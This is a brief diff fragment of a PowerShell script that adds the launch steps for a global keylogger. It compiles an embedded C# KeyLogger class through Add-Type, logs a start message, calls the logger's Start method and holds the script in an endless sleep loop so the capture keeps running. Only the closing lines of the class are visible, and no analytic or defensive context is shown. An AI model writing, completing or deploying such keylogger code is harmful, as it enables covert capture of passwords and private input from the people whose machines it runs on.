@@ -66,3 +66,15 @@ public class KeyLogger {
     }
 }
 "@
+
+# Compile the C# code and load it into PowerShell
+Add-Type -TypeDefinition $signature -Language CSharp
+
+# Start logging
+Log-Message "Starting global keylogger."
+
+# Start the keylogger
+[KeyLogger]::Start()
+
+# Keep script running
+while ($true) { Start-Sleep -Seconds 1 }
